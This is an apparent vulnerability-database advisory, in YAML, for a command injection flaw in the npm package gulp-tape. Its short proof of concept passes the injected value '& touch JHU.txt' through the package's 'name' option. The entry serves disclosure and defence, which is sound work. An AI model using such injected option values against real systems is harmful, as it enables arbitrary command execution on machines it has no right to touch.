---
- id: snykio:npm:gulp-tape:560124
  title: Command Injection
  description: |
    [gulp-tape][1] is a to run Tape tests in Gulp.

    Affected versions of this package are vulnerable to Command Injection.
    It is possible to inject arbitrary commands as part of `gulp-tape`
    options.

    ### PoC   {#poc}

        var root = require("gulp-tape");
        var gulp = require("gulp");
        var options = {
          name: "& touch JHU.txt"
        }
        gulp.src("./gulp-tape.js")
          .pipe(root(options));



    [1]: https://www.npmjs.com/package/gulp-tape
